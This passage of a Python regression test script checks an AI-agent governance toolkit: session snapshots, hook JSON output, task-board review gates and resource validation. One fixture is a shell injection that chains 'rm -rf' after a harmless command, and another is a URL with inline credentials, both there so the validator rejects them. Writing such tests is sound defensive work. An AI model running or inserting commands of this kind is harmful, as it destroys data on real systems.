        print("long git status smoke did not create an active session", file=sys.stderr)
        raise SystemExit(1)
    snapshot_path = target / ".agent" / "sessions" / session_id / "refs" / "git-status-short.txt"
    snapshot_text = snapshot_path.read_text(encoding="utf-8")
    current_status = run(["git", "status", "--short"], cwd=target).stdout
    if snapshot_text.rstrip("\n") != current_status.rstrip("\n"):
        print("session git status snapshot does not match current git status", file=sys.stderr)
        print(snapshot_path, file=sys.stderr)
        raise SystemExit(1)
    bootstrap_text = (target / ".agent" / "sessions" / session_id / "bootstrap.md").read_text(encoding="utf-8")
    if "refs/git-status-short.txt" not in bootstrap_text:
        print("bootstrap.md does not point to the full git status snapshot", file=sys.stderr)
        raise SystemExit(1)
    run([python, ".agent/tools/agent_session.py", "compact", "--summary", "Long status compact"], cwd=target)
    changes_text = (target / ".agent" / "sessions" / session_id / "changes.md").read_text(encoding="utf-8")
    if "refs/git-status-short.txt" not in changes_text:
        print("changes.md does not point to the full git status snapshot", file=sys.stderr)
        raise SystemExit(1)

    tracked = temp_root / "tracked-session-status"
    tracked.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(INIT_SCRIPT),
            str(tracked),
            "--layout",
            "minimal",
            "--remote-kind",
            "local",
            "--governance-profile",
            "core",
        ],
        cwd=PACKAGE_ROOT,
    )
    run(["git", "init"], cwd=tracked)
    run(["git", "config", "user.email", "review@example.com"], cwd=tracked)
    run(["git", "config", "user.name", "Review"], cwd=tracked)
    run(["git", "add", "."], cwd=tracked)
    run(["git", "commit", "-m", "init"], cwd=tracked)
    run(
        [
            python,
            ".agent/tools/agent_session.py",
            "start",
            "tracked-status",
            "--goal",
            "Tracked status smoke",
        ],
        cwd=tracked,
    )
    run(["git", "add", "."], cwd=tracked)
    run(["git", "commit", "-m", "session"], cwd=tracked)
    clean_status = run(["git", "status", "--short"], cwd=tracked).stdout
    if clean_status:
        print("tracked session fixture was not clean before read-only checks", file=sys.stderr)
        print(clean_status, file=sys.stderr)
        raise SystemExit(1)
    run([python, ".agent/tools/agent_session.py", "bootstrap"], cwd=tracked)
    run([python, ".agent/tools/agent_session.py", "doctor"], cwd=tracked)
    after_read_only = run(["git", "status", "--short"], cwd=tracked).stdout
    if after_read_only != clean_status:
        print("session bootstrap/doctor modified a clean tracked project", file=sys.stderr)
        print(after_read_only, file=sys.stderr)
        raise SystemExit(1)

    run([python, ".agent/tools/agent_session.py", "bootstrap", "--record"], cwd=tracked)
    tracked_index = json.loads((tracked / ".agent" / "sessions" / "index.json").read_text(encoding="utf-8"))
    tracked_session_id = tracked_index.get("active_session")
    tracked_snapshot = tracked / ".agent" / "sessions" / tracked_session_id / "refs" / "git-status-short.txt"
    tracked_status = run(["git", "status", "--short"], cwd=tracked).stdout
    if not tracked_status:
        print("explicit bootstrap --record did not refresh durable session artifacts", file=sys.stderr)
        raise SystemExit(1)
    if tracked_snapshot.read_text(encoding="utf-8").rstrip("\n") != tracked_status.rstrip("\n"):
        print("tracked session git status snapshot became stale after explicit bootstrap recording", file=sys.stderr)
        print(tracked_snapshot, file=sys.stderr)
        raise SystemExit(1)


def assert_native_hook_json_contract(target: Path, python: str) -> None:
    hook_path = target / ".agent" / "tools" / "governance_hook.py"
    if not hook_path.exists():
        print("governance hook script was not generated", file=sys.stderr)
        raise SystemExit(1)

    codex_hooks_path = target / ".codex" / "hooks.json"
    hooks = json.loads(codex_hooks_path.read_text(encoding="utf-8"))
    session_hooks = hooks.get("hooks", {}).get("SessionStart", [])
    commands = [
        item.get("command", "")
        for block in session_hooks
        for item in block.get("hooks", [])
        if isinstance(item, dict)
    ]
    if not commands or not all("--json-output" in command for command in commands):
        print("generated Codex hooks do not request JSON hook output", file=sys.stderr)
        print(json.dumps(hooks, indent=2), file=sys.stderr)
        raise SystemExit(1)

    stop = subprocess.run(
        [python, str(hook_path), "--event", "stop", "--json-output", "--strict-json-input"],
        cwd=target,
        text=True,
        input="\ufeff{\"additionalContext\":\"\"}",
        capture_output=True,
        check=False,
    )
    if stop.returncode != 0:
        print("JSON hook stop command failed with BOM stdin", file=sys.stderr)
        print(stop.stdout, file=sys.stderr)
        print(stop.stderr, file=sys.stderr)
        raise SystemExit(stop.returncode)
    stop_payload = json.loads(stop.stdout)
    if stop_payload.get("additionalContext") != "":
        print("JSON hook did not preserve empty additionalContext", file=sys.stderr)
        print(stop.stdout, file=sys.stderr)
        raise SystemExit(1)
    if stop_payload.get("hookSpecificOutput", {}).get("additionalContext") != "":
        print("JSON hook hookSpecificOutput did not preserve empty additionalContext", file=sys.stderr)
        print(stop.stdout, file=sys.stderr)
        raise SystemExit(1)

    invalid = subprocess.run(
        [python, str(hook_path), "--event", "stop", "--json-output", "--strict-json-input"],
        cwd=target,
        text=True,
        input="{invalid",
        capture_output=True,
        check=False,
    )
    if invalid.returncode == 0:
        print("strict JSON hook input unexpectedly passed", file=sys.stderr)
        print(invalid.stdout, file=sys.stderr)
        raise SystemExit(1)
    invalid_payload = json.loads(invalid.stdout)
    if invalid_payload.get("status") != "error":
        print("strict JSON hook failure did not emit JSON error status", file=sys.stderr)
        print(invalid.stdout, file=sys.stderr)
        raise SystemExit(1)


def assert_existing_project_adoption(init_script: Path, temp_root: Path, python: str) -> None:
    conflicted = temp_root / "adoption-conflict"
    conflicted.mkdir(parents=True, exist_ok=True)
    custom_agents = "custom existing agent instructions\n"
    (conflicted / "AGENTS.md").write_text(custom_agents, encoding="utf-8")
    dry_run = run(
        [
            python,
            str(init_script),
            str(conflicted),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
            "--dry-run",
        ],
        cwd=PACKAGE_ROOT,
        expect_ok=False,
    )
    dry_output = dry_run.stdout + dry_run.stderr
    for token in ("mode: dry-run", "would create:", "conflicts:", "AGENTS.md"):
        if token not in dry_output:
            print(f"dry-run adoption report missing {token!r}", file=sys.stderr)
            print(dry_output, file=sys.stderr)
            raise SystemExit(1)
    if (conflicted / "AGENTS.md").read_text(encoding="utf-8") != custom_agents:
        print("dry-run adoption modified an existing AGENTS.md", file=sys.stderr)
        raise SystemExit(1)

    stable = temp_root / "adoption-idempotent"
    stable.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(init_script),
            str(stable),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
        ],
        cwd=PACKAGE_ROOT,
    )
    rerun = run(
        [
            python,
            str(init_script),
            str(stable),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
            "--dry-run",
        ],
        cwd=PACKAGE_ROOT,
    )
    rerun_output = rerun.stdout + rerun.stderr
    if "unchanged:" not in rerun_output or "preserved durable state:" not in rerun_output or "conflicts:" in rerun_output:
        print("idempotent dry run did not report stable unchanged/preserved state", file=sys.stderr)
        print(rerun_output, file=sys.stderr)
        raise SystemExit(1)


def assert_context_glob_scoring(target: Path, python: str) -> None:
    context_path = target / ".agent" / "context.json"
    original = context_path.read_text(encoding="utf-8")
    fixture_dir = target / "context-glob-fixture"
    fixture_dir.mkdir(parents=True, exist_ok=True)
    fixture = fixture_dir / "oversized.md"
    fixture.write_text("x" * 400 + "\n", encoding="utf-8")
    context = json.loads(original)
    context["tracked_files"] = []
    context["tracked_globs"] = ["context-glob-fixture/*.md"]
    context["budgets"]["max_total_tracked_tokens"] = 50
    context["budgets"]["max_single_doc_tokens"] = 1000
    context_path.write_text(json.dumps(context, indent=2) + "\n", encoding="utf-8")
    try:
        context_doctor = run([python, ".agent/tools/agent_context.py", "doctor"], cwd=target, expect_ok=False)
        if "total tracked context over budget: 101 > 50" not in (context_doctor.stdout + context_doctor.stderr):
            print("context doctor did not count tracked_globs", file=sys.stderr)
            raise SystemExit(1)
        score = json.loads(run([python, "scripts/agent_score.py", "score", "--json"], cwd=target).stdout)
        dimension = score.get("dimensions", {}).get("context_budget", {})
        if dimension.get("status") != "fail" or not any("total context over budget" in finding for finding in dimension.get("findings", [])):
            print("governance score did not count tracked_globs", file=sys.stderr)
            print(json.dumps(dimension, indent=2), file=sys.stderr)
            raise SystemExit(1)
        if not any("1 tracked files" in evidence for evidence in dimension.get("evidence", [])):
            print("governance score did not report the glob-expanded file count", file=sys.stderr)
            print(json.dumps(dimension, indent=2), file=sys.stderr)
            raise SystemExit(1)
    finally:
        context_path.write_text(original, encoding="utf-8")
        fixture.unlink(missing_ok=True)
        fixture_dir.rmdir()


def assert_task_board_guards(init_script: Path, temp_root: Path, python: str) -> None:
    goal_args = [
        "--goal-raw",
        "User asked to guard task-board completion.",
        "--goal-refined",
        "Verify task-board completion gates reject missing review evidence after goal and decomposition evidence are present.",
        "--goal-refinement-rationale",
        "Regression fixture rewrites the raw request into a verifiable completion-gate goal.",
        "--goal-confirmation-status",
        "agent_assumed",
        "--goal-objective",
        "Verify task-board completion gates.",
        "--goal-outcome",
        "Task-board guards reject incomplete completion evidence.",
        "--goal-decision-summary",
        "Use deterministic local fixtures to verify task-board completion gates.",
        "--goal-spec-change",
        "regression-fixture",
        "--goal-non-goal",
        "Do not change application behavior.",
        "--goal-constraint",
        "Keep the regression fixture local and deterministic.",
        "--goal-success-evidence",
        "agent_task.py, agent_check.py, agent_verify.py, and agent_score.py all detect invalid completion states.",
        "--goal-stop-condition",
        "Stop when completion gates fail to reject an invalid fixture.",
    ]
    decomposition_args = [
        "--decomposition-status",
        "complete",
        "--decomposition-summary",
        "Create a task, satisfy requirements, then verify completion gates.",
        "--decomposition-next-task",
        "Run generated doctors and hard checks.",
        "--decomposition-evidence-path",
        "docs/features/guard-task/04_DEVELOPMENT.md",
        "--decomposition-subtask",
        "Create guard task",
        "--decomposition-subtask",
        "Verify completion gate rejection",
    ]
    risk_guard = temp_root / "task-board-risk-guards"
    risk_guard.mkdir(parents=True, exist_ok=True)
    run(
        [python, str(init_script), str(risk_guard), "--layout", "minimal", "--governance-profile", "standard"],
        cwd=PACKAGE_ROOT,
    )
    over_risk = run(
        [
            python,
            "scripts/agent_task.py",
            "new",
            "over-risk-task",
            "--title",
            "Over risk task",
            "--profile",
            "standard",
            "--risk",
            "critical",
        ],
        cwd=risk_guard,
        expect_ok=False,
    )
    if "exceeds profile standard max_risk high" not in (over_risk.stdout + over_risk.stderr):
        print("agent_task.py did not enforce workflow profile max_risk", file=sys.stderr)
        raise SystemExit(1)
    if (risk_guard / "docs" / "features" / "over-risk-task").exists():
        print("agent_task.py created feature docs before rejecting an over-risk task", file=sys.stderr)
        raise SystemExit(1)

    run(
        [
            python,
            "scripts/agent_task.py",
            "new",
            "risk-drift-task",
            "--title",
            "Risk drift task",
            "--profile",
            "standard",
            "--risk",
            "high",
        ],
        cwd=risk_guard,
    )
    risk_board_path = risk_guard / ".agent" / "task-board.json"
    risk_board = json.loads(risk_board_path.read_text(encoding="utf-8"))
    risk_board["items"][0]["risk"] = "critical"
    risk_board_path.write_text(json.dumps(risk_board, indent=2) + "\n", encoding="utf-8")
    drift_outputs = [
        run([python, "scripts/agent_task.py", "doctor"], cwd=risk_guard, expect_ok=False),
        run([python, "scripts/agent_check.py"], cwd=risk_guard, expect_ok=False),
        run([python, "scripts/agent_verify.py", "doctor"], cwd=risk_guard, expect_ok=False),
        run([python, "scripts/agent_score.py", "score", "--json"], cwd=risk_guard, expect_ok=False),
    ]
    drift_text = "\n".join(item.stdout + item.stderr for item in drift_outputs)
    if drift_text.count("exceeds profile standard max_risk high") < 3:
        print("manual risk/profile drift was not reported across generated hard checks", file=sys.stderr)
        print(drift_text, file=sys.stderr)
        raise SystemExit(1)

    human_guard = temp_root / "task-board-human-review-guards"
    human_guard.mkdir(parents=True, exist_ok=True)
    run(
        [python, str(init_script), str(human_guard), "--layout", "minimal", "--governance-profile", "standard"],
        cwd=PACKAGE_ROOT,
    )
    run(
        [
            python,
            "scripts/agent_task.py",
            "new",
            "high-risk-task",
            "--title",
            "High risk task",
            "--profile",
            "full",
            "--risk",
            "high",
        ],
        cwd=human_guard,
    )
    human_board_path = human_guard / ".agent" / "task-board.json"
    human_board = json.loads(human_board_path.read_text(encoding="utf-8"))
    high_task = human_board["items"][0]
    review_path = "docs/features/high-risk-task/05_CODE_REVIEW.md"
    high_task["current_stage"] = "quality_review"
    high_task["requirements"] = {
        "required": True,
        "status": "complete",
        "shared_understanding": "The high-risk review fixture scope is understood.",
        "domain_glossary_updated": True,
        "code_docs_cross_checked": True,
        "open_questions": [],
    }
    high_task["goal_contract"] = {
        "raw_user_goal": "Guard high-risk completion.",
        "refined_goal": "Require structured human review before high-risk verification.",
        "refinement_rationale": "The fixture isolates the risk-derived review gate.",
        "user_confirmation_status": "agent_assumed",
        "objective": "Verify human review enforcement.",
        "user_approved_outcome": "High-risk work cannot enter verification without human review.",
        "non_goals": ["Do not test application behavior."],
        "constraints": ["Use local deterministic evidence."],
        "success_evidence": ["Generated validators reject incomplete human review."],
        "stop_conditions": ["Stop when a bypass is accepted."],
        "current_decision_summary": "Use a full-profile high-risk task fixture.",
        "open_decisions": [],
        "linked_task_id": "high-risk-task",
        "linked_spec_change_id": "regression-fixture",
    }
    high_task["task_decomposition"] = {
        "required": True,
        "status": "complete",
        "summary": "Exercise missing, ordinary, and structured human review cases.",
        "next_task": "Attempt the verification transition.",
        "subtasks": ["Prepare review gates", "Verify the human review boundary"],
        "dependencies": [],
        "evidence_path": review_path,
        "no_task_board_tiny_evidence": "not-applicable",
    }
    high_task["stage_reviews"] = {
        stage: {
            "status": "pass",
            "latest_review": review_path,
            "latest_fix": "",
            "open_findings": [],
            "accepted_exception": "",
        }
        for stage in ("spec", "plan", "implementation", "spec_review")
    }
    human_board_path.write_text(json.dumps(human_board, indent=2) + "\n", encoding="utf-8")
    run([python, "scripts/agent_task.py", "doctor"], cwd=human_guard)
    human_board = json.loads(human_board_path.read_text(encoding="utf-8"))
    human_board["policy"]["human_review_legacy_exemptions"] = [
        {
            "task_id": "high-risk-task",
            "reason": "Invalid active-task bypass fixture.",
            "evidence": review_path,
        }
    ]
    human_board_path.write_text(json.dumps(human_board, indent=2) + "\n", encoding="utf-8")
    active_exemption = run([python, "scripts/agent_task.py", "doctor"], cwd=human_guard, expect_ok=False)
    if "must reference a terminal task" not in (active_exemption.stdout + active_exemption.stderr):
        print("active task was accepted by the human-review legacy exemption", file=sys.stderr)
        raise SystemExit(1)
    human_board["items"][0]["state"] = "done"
    human_board["items"][0]["updated_at"] = human_board["policy"]["human_review_enforcement_started_at"]
    human_board_path.write_text(json.dumps(human_board, indent=2) + "\n", encoding="utf-8")
    post_policy_exemption = run([python, "scripts/agent_task.py", "doctor"], cwd=human_guard, expect_ok=False)
    if "must predate policy enforcement" not in (post_policy_exemption.stdout + post_policy_exemption.stderr):
        print("post-policy terminal task was accepted by the human-review legacy exemption", file=sys.stderr)
        raise SystemExit(1)
    human_board["items"][0]["state"] = "proposed"
    human_board["policy"]["human_review_legacy_exemptions"] = []
    human_board_path.write_text(json.dumps(human_board, indent=2) + "\n", encoding="utf-8")
    run([python, "scripts/agent_task.py", "doctor"], cwd=human_guard)
    missing_human = run(
        [
            python,
            "scripts/agent_task.py",
            "update",
            "high-risk-task",
            "--stage",
            "verification",
            "--stage-review-stage",
            "quality_review",
            "--stage-review-status",
            "pass",
            "--stage-review-path",
            review_path,
        ],
        cwd=human_guard,
        expect_ok=False,
    )
    if "requires human_review evidence" not in (missing_human.stdout + missing_human.stderr):
        print("high-risk verification did not require risk-derived human review", file=sys.stderr)
        raise SystemExit(1)
    run(
        [
            python,
            "scripts/agent_task.py",
            "update",
            "high-risk-task",
            "--stage-review-stage",
            "human_review",
            "--stage-review-status",
            "pass",
            "--stage-review-path",
            review_path,
        ],
        cwd=human_guard,
    )
    ordinary_review = run(
        [
            python,
            "scripts/agent_task.py",
            "update",
            "high-risk-task",
            "--stage",
            "verification",
            "--stage-review-stage",
            "quality_review",
            "--stage-review-status",
            "pass",
            "--stage-review-path",
            review_path,
        ],
        cwd=human_guard,
        expect_ok=False,
    )
    if "human_review evidence must be an object" not in (ordinary_review.stdout + ordinary_review.stderr):
        print("ordinary stage review was accepted as structured human review", file=sys.stderr)
        raise SystemExit(1)
    human_board = json.loads(human_board_path.read_text(encoding="utf-8"))
    high_task = human_board["items"][0]
    high_task["current_stage"] = "verification"
    high_task["stage_reviews"]["quality_review"] = {
        "status": "pass",
        "latest_review": review_path,
        "latest_fix": "",
        "open_findings": [],
        "accepted_exception": "",
    }
    high_task["stage_reviews"]["human_review"] = {
        "status": "pass",
        "latest_review": review_path,
        "latest_fix": "",
        "open_findings": [],
        "accepted_exception": "",
        "evidence": {
            "reviewer_type": "human",
            "reviewer": "review-owner",
            "review_type": "diff-and-file-review",
            "diff_range": "base..head",
            "files_reviewed": ["scripts/agent_task.py"],
            "high_risk_paths_checked": ["task completion gate"],
            "conclusion": "Fixture review complete.",
        },
    }
    external_review = temp_root / "external-human-review.md"
    external_review.write_text("external\n", encoding="utf-8")
    escaped_review = os.path.relpath(external_review, human_guard)
    external_link = human_guard / "docs" / "external-human-review-link.md"
    try:
        external_link.symlink_to(external_review)
    except OSError:
        external_link = None
    invalid_review_paths = [str(external_review), ".", escaped_review]
    if external_link is not None:
        invalid_review_paths.append("docs/external-human-review-link.md")
    for invalid_path in invalid_review_paths:
        high_task["stage_reviews"]["human_review"]["latest_review"] = invalid_path
        human_board_path.write_text(json.dumps(human_board, indent=2) + "\n", encoding="utf-8")
        outputs = [
            run([python, "scripts/agent_task.py", "doctor"], cwd=human_guard, expect_ok=False),
            run([python, "scripts/agent_check.py"], cwd=human_guard, expect_ok=False),
            run([python, "scripts/agent_verify.py", "doctor"], cwd=human_guard, expect_ok=False),
            run([python, "scripts/agent_score.py", "score", "--json"], cwd=human_guard, expect_ok=False),
        ]
        output = "\n".join(item.stdout + item.stderr for item in outputs)
        if output.count("repository-local file") < 3:
            print(f"invalid human review path was not rejected across generated validators: {invalid_path}", file=sys.stderr)
            print(output, file=sys.stderr)
            raise SystemExit(1)
    high_task["stage_reviews"]["human_review"]["latest_review"] = review_path
    human_board_path.write_text(json.dumps(human_board, indent=2) + "\n", encoding="utf-8")
    run([python, "scripts/agent_task.py", "doctor"], cwd=human_guard)
    run(
        [
            python,
            "scripts/agent_task.py",
            "update",
            "high-risk-task",
            "--stage",
            "verification",
            "--stage-review-stage",
            "quality_review",
            "--stage-review-status",
            "pass",
            "--stage-review-path",
            review_path,
            "--human-reviewer-type",
            "human",
            "--human-reviewer",
            "review-owner",
            "--human-review-type",
            "diff-and-file-review",
            "--human-diff-range",
            "base..head",
            "--human-file-reviewed",
            "scripts/agent_task.py",
            "--human-high-risk-path-checked",
            "task completion gate",
            "--human-conclusion",
            "The high-risk gate is satisfied for this fixture.",
        ],
        cwd=human_guard,
    )
    run([python, "scripts/agent_task.py", "doctor"], cwd=human_guard)

    guarded = temp_root / "task-board-guards"
    guarded.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(init_script),
            str(guarded),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
        ],
        cwd=PACKAGE_ROOT,
    )
    run(
        [
            python,
            "scripts/agent_task.py",
            "new",
            "guard-task",
            "--title",
            "Guard task",
            "--profile",
            "standard",
        ],
        cwd=guarded,
    )
    bad_stage = run([python, "scripts/agent_task.py", "update", "guard-task", "--stage", "made_up_stage"], cwd=guarded, expect_ok=False)
    if "invalid stage" not in (bad_stage.stdout + bad_stage.stderr):
        print("agent_task.py did not reject an invalid current_stage", file=sys.stderr)
        print(bad_stage.stdout + bad_stage.stderr, file=sys.stderr)
        raise SystemExit(1)
    run(
        [
            python,
            "scripts/agent_task.py",
            "update",
            "guard-task",
            "--requirements-status",
            "complete",
            "--shared-understanding",
            "Guard task scope is understood.",
            "--domain-glossary-updated",
            "--code-docs-cross-checked",
        ],
        cwd=guarded,
    )
    done_without_conclusion = run([python, "scripts/agent_task.py", "update", "guard-task", "--state", "done"], cwd=guarded, expect_ok=False)
    if "conclusion" not in (done_without_conclusion.stdout + done_without_conclusion.stderr):
        print("agent_task.py did not reject done without delivery_conclusion", file=sys.stderr)
        print(done_without_conclusion.stdout + done_without_conclusion.stderr, file=sys.stderr)
        raise SystemExit(1)
    done_without_review = run(
        [
            python,
            "scripts/agent_task.py",
            "update",
            "guard-task",
            "--state",
            "done",
            "--conclusion",
            "Implemented and validated.",
            *goal_args,
            *decomposition_args,
        ],
        cwd=guarded,
        expect_ok=False,
    )
    if "review_gate" not in (done_without_review.stdout + done_without_review.stderr):
        print("agent_task.py did not reject done without a passing review gate", file=sys.stderr)
        print(done_without_review.stdout + done_without_review.stderr, file=sys.stderr)
        raise SystemExit(1)
    for stage in ("spec", "plan", "implementation", "spec_review", "quality_review", "verification", "handoff"):
        run(
            [
                python,
                "scripts/agent_task.py",
                "update",
                "guard-task",
                "--stage-review-stage",
                stage,
                "--stage-review-status",
                "pass",
                "--stage-review-path",
                "docs/features/guard-task/05_CODE_REVIEW.md",
                "--clear-stage-open-findings",
            ],
            cwd=guarded,
        )
    run(
        [
            python,
            "scripts/agent_task.py",
            "update",
            "guard-task",
            "--state",
            "done",
            "--conclusion",
            "Implemented and validated.",
            "--review-status",
            "pass",
            "--review-path",
            "docs/features/guard-task/05_CODE_REVIEW.md",
            "--clear-open-findings",
            "--requirements-status",
            "complete",
            "--shared-understanding",
            "Guard task scope is understood.",
            "--domain-glossary-updated",
            "--code-docs-cross-checked",
            *goal_args,
            *decomposition_args,
        ],
        cwd=guarded,
    )
    run([python, "scripts/agent_task.py", "doctor"], cwd=guarded)

    board_path = guarded / ".agent" / "task-board.json"
    board = json.loads(board_path.read_text(encoding="utf-8"))
    board["items"][0]["current_stage"] = "made_up_stage"
    board_path.write_text(json.dumps(board, indent=2) + "\n", encoding="utf-8")
    invalid_stage_outputs = [
        run([python, "scripts/agent_task.py", "doctor"], cwd=guarded, expect_ok=False),
        run([python, "scripts/agent_check.py"], cwd=guarded, expect_ok=False),
        run([python, "scripts/agent_verify.py", "doctor"], cwd=guarded, expect_ok=False),
        run([python, "scripts/agent_score.py", "score", "--json"], cwd=guarded, expect_ok=False),
    ]
    invalid_stage_text = "\n".join(item.stdout + item.stderr for item in invalid_stage_outputs)
    if "current_stage" not in invalid_stage_text:
        print("manual invalid current_stage was not reported by hard checks", file=sys.stderr)
        print(invalid_stage_text, file=sys.stderr)
        raise SystemExit(1)

    guarded_done = temp_root / "task-board-done-guard"
    guarded_done.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(init_script),
            str(guarded_done),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
        ],
        cwd=PACKAGE_ROOT,
    )
    run(
        [
            python,
            "scripts/agent_task.py",
            "new",
            "done-task",
            "--title",
            "Done task",
            "--profile",
            "standard",
        ],
        cwd=guarded_done,
    )
    done_board_path = guarded_done / ".agent" / "task-board.json"
    done_board = json.loads(done_board_path.read_text(encoding="utf-8"))
    done_board["items"][0]["state"] = "done"
    done_board["items"][0]["delivery_conclusion"] = ""
    done_board["items"][0]["requirements"] = {
        "required": True,
        "status": "complete",
        "shared_understanding": "Done guard task scope is understood.",
        "domain_glossary_updated": True,
        "code_docs_cross_checked": True,
        "open_questions": [],
    }
    done_board_path.write_text(json.dumps(done_board, indent=2) + "\n", encoding="utf-8")
    done_outputs = [
        run([python, "scripts/agent_task.py", "doctor"], cwd=guarded_done, expect_ok=False),
        run([python, "scripts/agent_check.py"], cwd=guarded_done, expect_ok=False),
        run([python, "scripts/agent_verify.py", "doctor"], cwd=guarded_done, expect_ok=False),
        run([python, "scripts/agent_score.py", "score", "--json"], cwd=guarded_done, expect_ok=False),
    ]
    done_text = "\n".join(item.stdout + item.stderr for item in done_outputs)
    if "delivery_conclusion" not in done_text:
        print("done task without delivery_conclusion was not reported by hard checks", file=sys.stderr)
        print(done_text, file=sys.stderr)
        raise SystemExit(1)

    review_guard = temp_root / "task-board-review-gate-guard"
    review_guard.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(init_script),
            str(review_guard),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
        ],
        cwd=PACKAGE_ROOT,
    )
    run(
        [
            python,
            "scripts/agent_task.py",
            "new",
            "review-task",
            "--title",
            "Review task",
            "--profile",
            "standard",
        ],
        cwd=review_guard,
    )
    review_board_path = review_guard / ".agent" / "task-board.json"
    review_board = json.loads(review_board_path.read_text(encoding="utf-8"))
    review_board["items"][0]["state"] = "done"
    review_board["items"][0]["delivery_conclusion"] = "Implemented and validated."
    review_board["items"][0]["requirements"] = {
        "required": True,
        "status": "complete",
        "shared_understanding": "Review guard task scope is understood.",
        "domain_glossary_updated": True,
        "code_docs_cross_checked": True,
        "open_questions": [],
    }
    review_board["items"][0]["review_gate"]["status"] = "needs-fix"
    review_board["items"][0]["review_gate"]["latest_review"] = "docs/features/review-task/05_CODE_REVIEW.md"
    review_board["items"][0]["review_gate"]["open_findings"] = ["major: missing regression coverage"]
    review_board_path.write_text(json.dumps(review_board, indent=2) + "\n", encoding="utf-8")
    review_gate_outputs = [
        run([python, "scripts/agent_task.py", "doctor"], cwd=review_guard, expect_ok=False),
        run([python, "scripts/agent_check.py"], cwd=review_guard, expect_ok=False),
        run([python, "scripts/agent_verify.py", "doctor"], cwd=review_guard, expect_ok=False),
        run([python, "scripts/agent_score.py", "score", "--json"], cwd=review_guard, expect_ok=False),
    ]
    review_gate_text = "\n".join(item.stdout + item.stderr for item in review_gate_outputs)
    if "review_gate" not in review_gate_text:
        print("done task with a failing review gate was not reported by hard checks", file=sys.stderr)
        print(review_gate_text, file=sys.stderr)
        raise SystemExit(1)

    for profile in ("tiny", "bugfix"):
        profile_guard = temp_root / f"task-board-{profile}-review-guard"
        profile_guard.mkdir(parents=True, exist_ok=True)
        run(
            [
                python,
                str(init_script),
                str(profile_guard),
                "--layout",
                "minimal",
                "--governance-profile",
                "standard",
            ],
            cwd=PACKAGE_ROOT,
        )
        task_id = f"{profile}-review-task"
        run(
            [
                python,
                "scripts/agent_task.py",
                "new",
                task_id,
                "--title",
                f"{profile} review task",
                "--profile",
                profile,
            ],
            cwd=profile_guard,
        )
        command = [
            python,
            "scripts/agent_task.py",
            "update",
            task_id,
            "--state",
            "done",
            "--conclusion",
            "Implemented and validated.",
            "--decomposition-status",
            "complete",
            "--decomposition-summary",
            f"Complete the {profile} review-gate regression fixture.",
            "--decomposition-next-task",
            "Verify missing review gate rejection.",
            "--decomposition-evidence-path",
            f"docs/features/{task_id}/04_DEVELOPMENT.md",
            "--decomposition-subtask",
            "Attempt done without review gate",
        ]
        if profile == "bugfix":
            command.extend(
                [
                    "--requirements-status",
                    "complete",
                    "--shared-understanding",
                    "Bugfix review-gate fixture scope is understood.",
                    "--domain-glossary-updated",
                    "--code-docs-cross-checked",
                    "--goal-raw",
                    "User asked to guard bugfix review completion.",
                    "--goal-refined",
                    "Verify bugfix tasks cannot complete without a passing review gate.",
                    "--goal-refinement-rationale",
                    "Regression fixture narrows the request to one completion-gate behavior.",
                    "--goal-confirmation-status",
                    "agent_assumed",
                    "--goal-objective",
                    "Verify bugfix review gate.",
                    "--goal-outcome",
                    "Bugfix task completion is blocked without review.",
                    "--goal-decision-summary",
                    "Use a deterministic bugfix fixture to verify universal review gates.",
                    "--goal-spec-change",
                    "regression-fixture",
                    "--goal-non-goal",
                    "Do not test standard stage-review behavior here.",
                    "--goal-constraint",
                    "Keep the fixture deterministic.",
                    "--goal-success-evidence",
                    "agent_task.py rejects done without review_gate.",
                    "--goal-stop-condition",
                    "Stop if bugfix done can bypass review_gate.",
                ]
            )
        profile_result = run(command, cwd=profile_guard, expect_ok=False)
        if "review_gate" not in (profile_result.stdout + profile_result.stderr):
            print(f"{profile} done task without review gate was not rejected by review_gate", file=sys.stderr)
            print(profile_result.stdout + profile_result.stderr, file=sys.stderr)
            raise SystemExit(1)


def assert_resource_catalog_guards(target: Path, python: str) -> None:
    run([python, "scripts/agent_resources.py", "doctor"], cwd=target)
    match = json.loads(
        run(
            [
                python,
                "scripts/agent_resources.py",
                "match",
                "--intent",
                "production repair database",
                "--include-disabled",
                "--json",
            ],
            cwd=target,
        ).stdout
    )
    candidate_ids = {item.get("id") for item in match.get("candidates", [])}
    excluded_ids = {item.get("id") for item in match.get("excluded", [])}
    if "staging-database-template" in candidate_ids or "staging-database-template" not in excluded_ids:
        print("resource match used do_not_use_for as positive matching evidence", file=sys.stderr)
        print(json.dumps(match, indent=2), file=sys.stderr)
        raise SystemExit(1)

    resources_path = target / ".agent" / "resources.json"
    original = resources_path.read_text(encoding="utf-8")
    resources = json.loads(original)

    def assert_bad_healthcheck(case_id: str, command: object, expected_text: str) -> None:
        case_resources = json.loads(original)
        case_resources["resources"][0]["health_checks"] = [
            {
                "id": case_id,
                "command": command,
                "risk": "low",
            }
        ]
        resources_path.write_text(json.dumps(case_resources, indent=2) + "\n", encoding="utf-8")
        result = run([python, "scripts/agent_resources.py", "doctor"], cwd=target, expect_ok=False)
        if expected_text not in (result.stdout + result.stderr):
            print(f"resource doctor did not reject unsafe healthcheck case: {case_id}", file=sys.stderr)
            print(result.stdout + result.stderr, file=sys.stderr)
            raise SystemExit(1)

    resources["resources"][0]["endpoint"]["url"] = "postgres://user:pass@example/db"
    resources_path.write_text(json.dumps(resources, indent=2) + "\n", encoding="utf-8")
    secret_url = run([python, "scripts/agent_resources.py", "doctor"], cwd=target, expect_ok=False)
    if "secret-looking inline value" not in (secret_url.stdout + secret_url.stderr):
        print("resource doctor did not reject a database URL with embedded credentials", file=sys.stderr)
        print(secret_url.stdout + secret_url.stderr, file=sys.stderr)
        raise SystemExit(1)

    assert_bad_healthcheck(
        "dangerous-shell",
        "echo ok; rm -rf /tmp/agent-gov-regression-sentinel",
        "shell metacharacters",
    )
    assert_bad_healthcheck(
        "inline-python",
